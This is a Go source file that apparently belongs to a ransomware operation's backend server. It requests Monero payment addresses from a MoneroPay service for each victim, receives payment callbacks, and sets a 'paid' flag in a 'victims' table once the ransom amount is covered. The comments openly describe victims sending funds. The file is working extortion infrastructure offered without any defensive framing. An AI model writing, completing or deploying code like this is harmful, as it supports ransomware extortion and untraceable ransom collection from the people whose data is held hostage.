package main

import (
	"bytes"
	"time"
	"encoding/json"
	"net/http"
	"log"
	"net/url"

	"github.com/go-chi/chi/v5"
)

type callbackData struct {
	Amount struct {
		Covered struct {
			Total uint64 `json:"total"`
		} `json:"covered"`
	} `json:"amount"`
	Transaction struct {
		Locked bool `json:"locked"`
	} `json:"transaction"`
}

// Handle MoneroPay callbacks. They are sent whenever the victim sends funds
// to the wallet addresses or whenever these funds unlock. The unlock events
// are unnecessary so we'll ignore them.
func moneroPayCallbackHandler(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var data callbackData
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		log.Println(err)
		writeError(w, err)
		return
	}
	// Ignore unlock event callbacks
	if !data.Transaction.Locked {
		return
	}
	// Ignore incomplete payments
	if data.Amount.Covered.Total < Conf.amount {
		return
	}
	// Set ransom paid to true in the database
	if err := pdbExec(r.Context(),
	    "UPDATE victims SET paid=true WHERE id=$1", id); err != nil {
		log.Println("Error setting paid=true:",err)
	}
}

type subaddressRequest struct {
	Amount uint64 `json:"amount"`
	CallbackUrl string `json:"callback_url"`
}

type subaddressResponse struct {
	Address string `json:"address"`
}

// Make a post request to MoneroPay to create a new payment request.
// Return a Monero wallet address for the victim.
func createMoneroPayRequest(id string, amount uint64) (string, error) {
	u, err := url.JoinPath(Conf.callbackAddr, "/callback/" + id)
	if err != nil {
		return "", err
	}
	jr := subaddressRequest{
		Amount: amount,
		CallbackUrl: u,
	}
	b := new(bytes.Buffer)
	if err := json.NewEncoder(b).Encode(jr); err != nil {
		return "", err
	}
	req, err := http.NewRequest("POST", Conf.moneroPayAddr, b)
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")
	cl := &http.Client{Timeout: 15 * time.Second}
	resp, err := cl.Do(req)
	if err != nil {
		return "", err
	}
	var mr subaddressResponse
	if err := json.NewDecoder(resp.Body).Decode(&mr); err != nil {
		return "", err
	}
	return mr.Address, nil
}
